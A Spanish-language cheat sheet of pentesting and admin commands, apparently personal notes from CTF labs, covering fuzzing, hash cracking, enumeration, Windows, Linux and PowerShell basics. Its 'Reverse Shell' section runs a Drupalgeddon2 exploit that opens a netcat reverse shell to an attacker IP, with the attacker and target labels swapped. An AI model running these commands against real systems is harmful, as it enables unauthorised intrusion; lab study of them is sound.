
# Comandos Útiles para Ciberseguridad, Pentesting y Hacking Ético

Esta documentación proporciona una colección de comandos útiles para diversas tareas en ciberseguridad, pentesting y hacking ético, incluyendo una breve descripción de su función.

## HTTP Requests y Fuzzing

### curl

Realiza peticiones HTTP para interactuar con servidores web.

```bash
curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum  # Obtiene el hash MD5 de un recurso web.
curl http://10.10.245.129/ -v  # Realiza una petición HTTP y muestra información detallada.
```

### ffuf

Realiza fuzzing en directorios y parámetros de aplicaciones web para descubrir vulnerabilidades.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.10.245.129/FUZZ  # Fuzzing de la URL con una lista de palabras.
```

### dirb, gobuster

Descubre directorios y archivos ocultos en servidores web mediante fuerza bruta.

```bash
dirb http://10.10.245.129/ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  # Busca directorios en el sitio web.
gobuster dir --url http://10.10.245.129/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  # Similar a dirb, pero con más opciones.
```

***

## Cracking y Hashing

### Hashcat

Descifra hashes de contraseñas utilizando diferentes métodos (diccionario, fuerza bruta, etc.).

```bash
hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt  # Descifra un hash MD5 con sal usando un diccionario.
```

### Generar Hashes

Calcula hashes MD5 y SHA256 para verificar la integridad de archivos o datos.

```bash
echo -n "LearnTheHashFunction" | md5sum  # Calcula el hash MD5 de la cadena.
echo -n "ThisIsAMoreSecureHashFunction" | sha256sum  # Calcula el hash SHA256 de la cadena.
echo -n "ThisIsAMoreSecureHashFunction" | sha256sum | awk '{printf $1}' | md5sum  # Calcula el hash MD5 del hash SHA256.
```

### John the Ripper

Descifra hashes de contraseñas utilizando diferentes formatos y diccionarios.

```bash
john --format=drupal7 --wordlist=/usr/share/wordlists/rockyou.txt ~/CTFs/VulnHub/DC-1/admin_hash.txt  # Descifra un hash de Drupal 7 usando un diccionario.
```

***

## Base64

### Codificación y Decodificación Base64

Codifica datos binarios en texto ASCII para facilitar su transmisión.

```bash
base64 -d base64-c6d8efd649ad94af23eb2bd2af63edd0.txt  # Decodifica una cadena Base64.
echo -n "recuerdaquebase64NOescifrar" | md5sum  # Muestra que Base64 no cifra, solo codifica.
# Resultado: cf9df460535b4ec175a464c6c120d3fe
```

***

## Scripting

### Script de Git en Bash

Automatiza comandos de Git para la gestión de versiones.

```bash
#!/bin/bash

# Cambia al directorio deseado
cd 'C:\Users\renek\OneDrive\Documentos\P Y T  H O N\'

# Ejecuta comandos de Git
git add .
git commit -m 'Update changes from PC'
git push origin main --force
```

***

## Reverse Shell

### Atacante

Establece una reverse shell utilizando una vulnerabilidad en Drupal y netcat.

```bash
python2 drupalgeddon2.py -h http://10.0.2.5 -c 'nohup nc -e /bin/bash 10.0.2.15 9000 &'  # Explota la vulnerabilidad y establece la conexión.
```

### Objetivo

Escucha conexiones entrantes con netcat para recibir la shell.

```bash
nc -lnvp 9000  # Escucha en el puerto 9000.
```

***

## Enumeración

### Buscar archivos SUID

Identifica archivos con permisos SUID que pueden permitir la elevación de privilegios.

```bash
find / -perm -u=s 2>/dev/null  # Busca archivos con el bit SUID activado.
```

### WhatWeb

Identifica tecnologías utilizadas en un sitio web para identificar posibles vectores de ataque.

```bash
whatweb <ip> | awk '{gsub(/], /, "],\n" ); print}'  # Escanea el sitio web y formatea la salida.
```

***

## Manipulación de Archivos

### Mostrar contenido de archivo

```bash
cat archivo.txt
```

### Codificar archivo en Base64

```bash
cat archivo.txt | base64
```

### Decodificar Base64

```bash
echo "cGFsbGFiaHJhcw==" | base64 -d
```

### Calcular hash MD5 de archivo

```bash
md5sum archivo.txt
```

### Calcular hash SHA-256 de archivo

```bash
sha256sum archivo.txt
```

***

## Descarga de Archivos (Wget)

### wget

Permite descargar archivos desde la web a través de HTTP.

```bash
wget https://ejemplo.com/archivo.txt  # Descarga un archivo específico
wget -O nuevo_nombre.txt https://ejemplo.com/archivo.txt  # Guarda el archivo con otro nombre
wget -r -np -nH https://ejemplo.com/directorio/  # Descarga recursivamente un directorio
```

***

## Transferencia de Archivos con SCP (SSH)

### scp

Permite copiar archivos de forma segura entre dos sistemas usando el protocolo SSH.

```bash
scp archivo.txt usuario@192.168.1.30:/home/usuario/destino.txt  # Copia un archivo a un sistema remoto
scp usuario@192.168.1.30:/home/usuario/archivo.txt ./  # Copia un archivo desde un sistema remoto al actual
scp -r directorio usuario@192.168.1.30:/home/usuario/  # Copia un directorio completo a un sistema remoto
```

***

## Servidor Web Simple (Python)

### Iniciar un servidor HTTP

```bash
python3 -m http.server
python3 -m http.server 8080
python3 -m http.server --directory /ruta/del/directorio/
```

***

## Acceso a un Bash del Sistema con Meterpreter

### Obtener acceso a un bash del sistema a través de Meterpreter

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

***

## Fuerza Bruta y Análisis de Directorios

### ffuf

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.10.245.129/FUZZ
```

### dirb

```bash
dirb http://10.10.245.129/ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

### gobuster

```bash
gobuster dir --url http://10.10.245.129/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

***

## Análisis de Malware e IPs

### Defanging de una IP o URL

Transforma direcciones para evitar ejecuciones accidentales. Ejemplo:

```bash
204[.]93[.]183[.]11
```

### Generar un hash SHA-256 para analizar malware

```bash
sha256sum <nombre_del_archivo>
```

## Sistemas Operativos

### Windows

#### Herramientas y Comandos

*   **`shutdown`**: Apaga o reinicia el sistema.
    *   **Descripción:** Permite apagar o reiniciar el equipo con diferentes opciones.
    *   `shutdown /r /t 0` (Reinicia el equipo inmediatamente)
    *   `shutdown /s /t 3600` (Apaga el equipo en una hora)
*   **`netstat`**: Muestra las conexiones de red activas.
    *   **Descripción:** Muestra las conexiones TCP activas, los puertos en los que el equipo está escuchando, las estadísticas de Ethernet, la tabla de enrutamiento IP, las estadísticas de IPv4 (para los protocolos IP, ICMP, UDP y TCP) y las estadísticas de IPv6 (para los protocolos IPv6, ICMPv6, UDPv6 y TCPv6).
    *   `netstat -a` (Muestra todas las conexiones y puertos de escucha.)
    *   `netstat -b` (Muestra el ejecutable involucrado en la creación de cada conexión o puerto de escucha. Requiere permisos de administrador.)
*   **`msconfig`**: Utilidad de configuración del sistema.
    *   **Descripción:** Abre la herramienta de configuración del sistema, que permite modificar las opciones de inicio, servicios, etc.
    *   Simplemente escribir `msconfig` en la línea de comandos.
    *   No tiene opciones de línea de comandos comunes, se usa principalmente de forma interactiva.
*   **`xfreerdp`**: Cliente de escritorio remoto para sistemas Unix/Linux (pero mencionado aquí en el contexto de Windows).
    *   **Descripción:** Permite conectarse a un servidor de escritorio remoto (RDP).
    *   `xfreerdp /v:192.168.1.100` (Conecta a la dirección IP 192.168.1.100)
    *   `xfreerdp /u:usuario /p:contraseña /v:servidor` (Conecta con un usuario y contraseña específicos.)
*   **`tracert`**: Traza la ruta a un destino de red.
    *   **Descripción:** Muestra la ruta que siguen los paquetes para llegar a un host remoto.
    *   `tracert google.com` (Traza la ruta a google.com)
    *   `tracert 192.168.1.1` (Traza la ruta a la dirección IP 192.168.1.1)
*   **`tasklist`**: Muestra la lista de procesos en ejecución.
    *   **Descripción:** Muestra una lista de las aplicaciones y procesos en ejecución en el sistema, permitiendo filtrar por diferentes criterios.
    *   `tasklist /?` (Muestra la ayuda del comando tasklist.)
    *   `tasklist /FI "imagename eq notepad.exe"` (Muestra todos los procesos cuyo nombre de imagen es notepad.exe)
*   **`taskkill`**: Termina un proceso.
    *   **Descripción:** Termina uno o más procesos en ejecución.
    *   `taskkill /PID 1516` (Termina el proceso con el ID 1516)
    *   `taskkill /IM notepad.exe` (Termina todos los procesos con el nombre de imagen notepad.exe)
*   **`chkdsk`**: Comprueba el sistema de archivos y los volúmenes del disco en busca de errores y sectores defectuosos.
    *   **Descripción:** Examina un disco y muestra un informe de estado. También puede corregir errores lógicos del sistema de archivos.
    *   `chkdsk C:` (Comprueba la unidad C:)
    *   `chkdsk D: /f` (Comprueba y corrige errores en la unidad D:)
*   **`driverquery`**: Muestra una lista de los controladores de dispositivo instalados.
    *   **Descripción:** Enumera todos los controladores de dispositivo instalados en el sistema, incluyendo información como el nombre del módulo, tipo de controlador, y fecha de enlace.
    *   Simplemente escribir `driverquery` en la línea de comandos.
    *   `driverquery /v` (Muestra información detallada.)
*   **`sfc /scannow`**: Analiza los archivos del sistema en busca de corrupción y los repara si es posible.
    *   **Descripción:** Analiza la integridad de todos los archivos protegidos del sistema y reemplaza las versiones incorrectas con las versiones correctas de Microsoft.
    *   Simplemente escribir `sfc /scannow` en la línea de comandos (requiere privilegios de administrador).
    *   `sfc /verifyonly` (Solo verifica la integridad, no repara.)
*   **`more`**: Muestra archivos de texto.
    *   **Descripción:** Muestra el contenido de un archivo de texto, permitiendo la visualización página por página.
    *   `more file.txt` (Muestra el contenido de file.txt)
    *   `some_command | more` (Envía la salida de un comando a `more` para visualizarla página por página)

### Linux

#### Permisos

*   **`chmod`**: Modifica los permisos de archivos y directorios.
    *   **Descripción:** Cambia los permisos de acceso a archivos y directorios, controlando quién puede leer, escribir o ejecutar.

    *   **Modificación con notación octal:**
        *   `chmod 664 fichero.txt` (Establece permisos de lectura y escritura para el propietario y el grupo, y solo lectura para otros.)
        *   `chmod 755 archivo.sh` (Establece permisos de lectura, escritura y ejecución para el propietario, y lectura y ejecución para el grupo y otros.)

    *   **Modificación con notación simbólica:**
        *   `u` (usuario/propietario), `g` (grupo), `o` (otros), `a` (todos)
        *   `+` (añade permiso), `-` (quita permiso), `=` (establece permiso)
        *   `r` (lectura), `w` (escritura), `x` (ejecución)
        *   `chmod a=r fichero.txt` (Establece permiso de solo lectura para todos.)
        *   `chmod u+w,g+w fichero.txt` (Añade permiso de escritura al propietario y al grupo.)
        *   `chmod o=rwx fichero.txt` (Establece permiso de lectura, escritura y ejecución para otros.)
        *   `chmod g-w fichero.txt` (Quita permiso de escritura al grupo.)
        *   `chmod u+x,g+wx,o+w fichero.txt` (Añade permiso de ejecución al propietario, lectura, escritura y ejecución al grupo, y escritura a otros.)

*   **`umask`**: Establece la máscara de creación de archivos.
    *   **Descripción:** Define los permisos que se *restringen* al crear nuevos archivos y directorios. Funciona sustrayendo los bits de la máscara de los permisos por defecto (666 para archivos, 777 para directorios). No encontré ejemplos claros en tus notas, pero es importante saber para qué sirve. Un valor común es `022`, que previene que el grupo y otros tengan permisos de escritura por defecto.
*   **`sudo`**: Ejecuta un comando como superusuario.
    *   **Descripción:** Permite a un usuario ejecutar comandos con los privilegios del superusuario (root).
    *   `sudo apt update` (Actualiza la lista de paquetes disponibles.)
    *   `sudo nano /etc/hosts` (Edita el archivo hosts con privilegios de administrador.)
*   **`su`**: Cambia de usuario.
    *   **Descripción:** Permite cambiar al usuario root o a otro usuario especificado.
    *   `su` (Cambia al usuario root.)
    *   `su usuario` (Cambia al usuario especificado.)
*   **`root`**: Cuenta de superusuario con privilegios ilimitados. No es un comando en sí, sino el nombre de la cuenta.
    *   **Descripción:** El usuario con los máximos privilegios en el sistema Linux.
*   **`setuid`, `setgid`, `sticky bit`**: Mecanismos especiales de permisos.
    *   **Descripción:** Estos son bits de permisos especiales que modifican la forma en que se ejecutan los archivos y se acceden a los directorios.
        *   `setuid`: Cuando se establece en un ejecutable, este se ejecuta con los privilegios del *propietario* del archivo, no del usuario que lo ejecuta.
        *   `setgid`: Cuando se establece en un ejecutable, este se ejecuta con los privilegios del *grupo* del archivo. Cuando se establece en un directorio, los nuevos archivos creados en ese directorio heredarán el grupo del directorio.
        *   `sticky bit`: Cuando se establece en un directorio, solo el propietario del archivo, el propietario del directorio y el usuario root pueden eliminar o renombrar archivos dentro de ese directorio.
    *   `chmod u+s archivo` (Establece el bit setuid en el archivo.)
    *   `chmod g+s directorio` (Establece el bit setgid en el directorio.)
    *   `chmod +t directorio` (Establece el sticky bit en el directorio.)

### Linux Shells (Intérpretes de Comandos)

*   **`echo $SHELL`**: Muestra el shell actual.
    *   **Descripción:** Imprime en la terminal el shell que está actualmente en uso.
    *   `echo $SHELL` (Muestra la ruta del shell actual, por ejemplo, `/bin/bash`)
*   **`cat /etc/shells`**: Muestra la lista de shells disponibles en el sistema.
    *   **Descripción:** Lista los shells instalados que están permitidos para ser usados por los usuarios del sistema.
    *   `cat /etc/shells` (Muestra la lista de shells instalados.)
*   **`chsh`**: Cambia el shell de inicio de sesión.
    *   **Descripción:** Permite a un usuario cambiar su shell de inicio de sesión predeterminado.
    *   `chsh -s /usr/bin/zsh` (Cambia el shell a Zsh.)
    *   `chsh` (Cambia el shell, solicitando la nueva ruta al usuario.)
*   Shells comunes:
    *   **Bash (Bourne Again Shell):** El shell predeterminado en muchas distribuciones de Linux. Ofrece scripting, finalización con tabulador e historial de comandos.
    *   **Fish (Friendly Interactive Shell):** Se centra en la facilidad de uso, con una sintaxis simple, corrección ortográfica automática y resaltado de sintaxis.
    *   **Zsh (Z Shell):** Un shell moderno con finalización con tabulador avanzada, scripting y amplias opciones de personalización.

| Característica           | Bash                                                                                                                                                                                                                                                                       | Fish                                                                                                                                                 | Zsh                                                                                                                                                                                                                                                                                       |
| ------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Nombre Completo          | Bourne Again Shell                                                                                                                                                                                                                                                        | Friendly Interactive Shell                                                                                                                            | Z Shell                                                                                                                                                                                                                                                                                     |
| Scripting                | Ampliamente compatible, extensa documentación disponible.                                                                                                                                                                                                                 | Características de scripting limitadas.                                                                                                                | Excelente nivel de scripting, combina las capacidades tradicionales de Bash con características adicionales.                                                                                                                                                                                      |
| Finalización con Tabulador | Básica.                                                                                                                                                                                                                                                                    | Avanzada, ofrece sugerencias basadas en comandos anteriores.                                                                                             | Muy extendible mediante plugins.                                                                                                                                                                                                                                                               |
| Personalización          | Nivel básico.                                                                                                                                                                                                                                                              | Buena personalización a través de herramientas interactivas.                                                                                              | Personalización avanzada a través del framework oh-my-zsh.                                                                                                                                                                                                                                   |
| Facilidad de Uso         | Menos amigable para el usuario, pero los usuarios están familiarizados con él.                                                                                                                                                                                               | El más amigable para el usuario.                                                                                                                      | Puede ser muy amigable para el usuario con la personalización adecuada.                                                                                                                                                                                                                       |
| Resaltado de Sintaxis      | No disponible.                                                                                                                                                                                                                                                             | Incorporado.                                                                                                                                          | Se puede añadir con plugins.                                                                                                                                                                                                                                                                |

### Linux Shell Scripting (Creación de Scripts)

*   **Creación de un script:**
    1.  Abrir un editor de texto (ej., `nano`).
    2.  Crear un archivo con la extensión `.sh` (ej., `nano first_script.sh`).
    3.  Añadir el shebang al principio del archivo: `#!/bin/bash` (indica el intérprete a utilizar).
    4.  Escribir los comandos del script.
    5.  Guardar el archivo.
*   **Ejecución de un script:**
    1.  Dar permisos de ejecución al script: `chmod +x nombre_del_script.sh`.
    2.  Ejecutar el script: `./nombre_del_script.sh`. Es necesario usar `./` para indicar que el script se encuentra en el directorio actual.

#### Elementos fundamentales de un script:

*   **Variables:** Almacenan valores.
    *   **Ejemplo:**

    ```bash
    #!/bin/bash
    echo "Por favor, ingresa tu nombre:"
    read usuario
    echo "Hola, $usuario!"
    ```

*   **Bucles (Loops):** Repiten un bloque de código.
    *   **Ejemplo:**

    ```bash
    #!/bin/bash
    for i in {1..5}; do
        echo "Iteración número: $i"
    done
    ```

*   **Sentencias condicionales:** Ejecutan código según una condición.
    *   **Ejemplo:**

    ```bash
    #!/bin/bash
    echo "Ingresa un número:"
    read numero
    if [ "$numero" -gt 10 ]; then
        echo "El número es mayor que 10."
    else
        echo "El número es menor o igual que 10."
    fi
    ```

*   **Comentarios:** Añaden explicaciones al código. Se inician con `#`.

    ```bash
    #!/bin/bash

    # Pide al usuario que ingrese un número.
    echo "Ingresa un número:"

    # Almacena el número ingresado en una variable.
    read numero

    # Comprueba si el número es mayor que cero.
    if [ "$numero" -gt 0 ]; then
        # Si es mayor que cero, muestra el mensaje.
        echo "El número es positivo."
    # Define la acción si la condición no se cumple.
    else
        echo "El número es cero o negativo."
    fi
    ```

### PowerShell

*   **`Get-Alias`**: Muestra la lista de alias definidos en la sesión actual.
    *   **Descripción:** Recupera los alias disponibles. Un alias es un nombre alternativo (más corto) para un cmdlet o comando.
    *   `Get-Alias` (Lista todos los alias.)
    *   `Get-Alias -Name <alias>` (Muestra el cmdlet al que apunta el alias especificado, por ejemplo `ls`, `cat`, `rm`.)
*   **`Get-Command`**: Obtiene información sobre comandos (cmdlets, funciones, alias, etc.).
    *   **Descripción:** Permite buscar y obtener detalles sobre comandos disponibles en PowerShell.
    *   `Get-Command` (Lista todos los comandos disponibles.)
    *   `Get-Command -CommandType "Cmdlet"` (Lista solo los cmdlets.)
    *   `Get-Command -CommandType "Function"` (Lista solo las funciones.)
    *   `Get-Command -Name "*<palabraClave>*"` (Busca cmdlets que contengan `<palabraClave>` en su nombre, por ejemplo "*Process*", "*Service*".)
    *   `Get-Command -Name "<nombreParcial>*"` (Busca cmdlets que comiencen con `<nombreParcial>`).
*   **`Get-Content`**: Obtiene el contenido de un archivo.
    *   **Descripción:** Lee el contenido de un archivo y lo muestra en la consola.
    *   `Get-Content <nombreArchivo>.txt` (Muestra el contenido de `<nombreArchivo>.txt`.)
    *   `Get-Content -Path .\<nombreArchivo>.txt` (Muestra el contenido del archivo `<nombreArchivo>.txt` en el directorio actual.)
*   **`Get-ChildItem`**: Lista los archivos y directorios en una ubicación específica.
    *   **Descripción:** Similar al comando `ls` en Linux, muestra los elementos (archivos y directorios) en una ruta dada.
    *   `Get-ChildItem` (Lista los archivos y directorios en el directorio actual.)
    *   `Get-ChildItem -Path <ruta>` (Lista los archivos y directorios en la ruta especificada, por ejemplo `C:\Windows\`.)
*   **`Get-Location`**: Muestra la ubicación actual.
    *   **Descripción:** Imprime el directorio actual.
    *   `Get-Location` (Muestra la ruta del directorio actual.)
*   **`Set-Location`**: Cambia el directorio actual.
    *   **Descripción:** Similar al comando `cd` en Linux.
    *   `Set-Location <ruta>` (Cambia al directorio especificado, por ejemplo `C:\Program Files\`.)
    *   `Set-Location ..` (Sube un nivel en la jerarquía de directorios.)
*   **`Sort-Object`**: Ordena los objetos según una o más propiedades.
    *   **Descripción:** Ordena los objetos que recibe como entrada según las propiedades especificadas.
    *   `Get-ChildItem | Sort-Object Length` (Lista los archivos y directorios ordenados por tamaño, de menor a mayor.)
    *   `Get-ChildItem -Path <ruta> | Sort-Object Length -Descending` (Lista los archivos y directorios en el directorio especificado, ordenados por tamaño de mayor a menor.)
    *   `Get-ChildItem -Path <ruta> | Sort-Object Length | Select-Object -First 1` (Muestra el archivo o directorio más pequeño en el directorio especificado.)
*   **`Where-Object`**: Filtra los objetos según una condición.
    *   **Descripción:** Permite filtrar una colección de objetos basándose en una condición específica.
    *   `Get-ChildItem | Where-Object -Property "Extension" -eq ".<extension>"` (Lista solo los archivos con la extensión `.extension` en el directorio actual.)
    *   `Get-ChildItem | Where-Object -Property "Length" -gt <tamaño>` (Lista los archivos cuyo tamaño es mayor que `<tamaño>` bytes.)
    *   **Operadores de comparación:**
        *   `-eq`: Igual a.
        *   `-ne`: No igual a.
        *   `-gt`: Mayor que.
        *   `-ge`: Mayor o igual que.
        *   `-lt`: Menor que.
        *   `-le`: Menor o igual que.
        *   `-like`: Comodín (ej., `"*<texto>*"` para buscar nombres que contengan `<texto>`).
*   **`Select-Object`**: Selecciona propiedades específicas de los objetos.
    *   **Descripción:** Permite elegir qué propiedades de los objetos se mostrarán en la salida.
    *   `Get-ChildItem | Select-Object Name, Length` (Muestra solo el nombre y el tamaño de los archivos y directorios.)
    *   `Get-ChildItem | Select-Object Name, Mode` (Muestra solo el nombre y el modo de los archivos y directorios.)
*   **`Get-Help`**: Muestra la ayuda de un comando.
    *   **Descripción:** Proporciona información sobre cómo utilizar un cmdlet, incluyendo su sintaxis, parámetros y ejemplos.
    *   `Get-Help <comando>` (Muestra la ayuda del cmdlet `<comando>`.)
    *   `Get-Help <comando> -Examples` (Muestra ejemplos de uso del cmdlet `<comando>`.)
    *   `Get-Help <comando> -Full` (Muestra la ayuda completa del cmdlet `<comando>`.)
*   **`Get-FileHash`**: Calcula el hash de un archivo.
    *   **Descripción:** Calcula el hash criptográfico de un archivo, útil para verificar su integridad.
    *   `Get-FileHash -Path .\<archivo>.txt` (Calcula el hash del archivo `<archivo>.txt` en el directorio actual.)
*   **`Get-Service`**: Obtiene información sobre los servicios.
    *   **Descripción:** Enumera los servicios instalados en el sistema, incluyendo su estado (en ejecución, detenido, etc.).
    *   `Get-Service` (Lista todos los servicios.)
    *   `Get-Service | Where-Object -Property DisplayName -like '*<palabraClave>*'` (Lista los servicios cuyo nombre para mostrar contiene `<palabraClave>`.)
*   **`Invoke-Command`**: Ejecuta comandos en un equipo remoto.
    *   **Descripción:** Permite ejecutar comandos o scripts en uno o más equipos remotos.
    *   `Invoke-Command -ComputerName <nombreEquipo> -ScriptBlock { Get-Service }` (Ejecuta el cmdlet `Get-Service` en el equipo llamado `<nombreEquipo>`.)
    *   `Invoke-Command -FilePath <rutaScript> -ComputerName <nombreEquipo>` (Ejecuta el script en la ruta especificada en el equipo llamado `<nombreEquipo>`.)
    *   `Invoke-Command -ComputerName <nombreEquipo> -Credential <dominio>\<usuario> -ScriptBlock { Get-Culture }` (Ejecuta el cmdlet `Get-Culture` en el equipo llamado `<nombreEquipo>` utilizando las credenciales del usuario `<dominio>\<usuario>`.)

### Otros Comandos PowerShell

*   **`Get-ComputerInfo`**: Obtiene información sobre el equipo.
*   **`Get-LocalUser`**: Obtiene información sobre los usuarios locales.
*   **`Get-NetIPConfiguration`**: Obtiene información sobre la configuración de red IP.
*   **`Get-NetIPAddress`**: Obtiene información sobre las direcciones IP.
*   **`Get-Process`**: Obtiene información sobre los procesos en ejecución.
*   **`Get-NetTCPConnection`**: Obtiene información sobre las conexiones TCP.
*   **`Find-Module`**: Encuentra módulos disponibles en el PowerShell Gallery.
    *   `Find-Module -name "*<palabraClave>*"` (Busca módulos que contengan `<palabraClave>` en su nombre.)
    *   `Find-Module -name "<nombreParcial>*"` (Busca módulos que comiencen con `<nombreParcial>`.)
*   **`Install-Module`**: Instala un módulo desde el PowerShell Gallery.
    *   `Install-Module -Name "<nombreModulo>"` (Instala el módulo `<nombreModulo>`.)
*   **`Select-String`**: Busca texto en cadenas y archivos.
    *   `Select-String -Pattern '<patron>' -Path <archivo>` (Busca el patrón `<patron>` dentro del archivo `<archivo>`.)
    *   `Get-Content <archivo> | Select-String -Pattern '<patron>'` (Lee el archivo y busca líneas que coincidan con el patrón `<patron>`.)
